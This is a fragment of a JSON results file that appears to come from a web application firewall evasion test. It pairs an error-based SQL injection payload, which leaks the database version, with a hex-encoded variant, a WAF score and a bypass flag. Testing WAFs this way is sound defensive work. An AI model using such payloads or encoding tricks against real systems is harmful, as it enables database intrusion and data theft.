+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "0x312720414e44202853454c45435420312046524f",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+}
+]
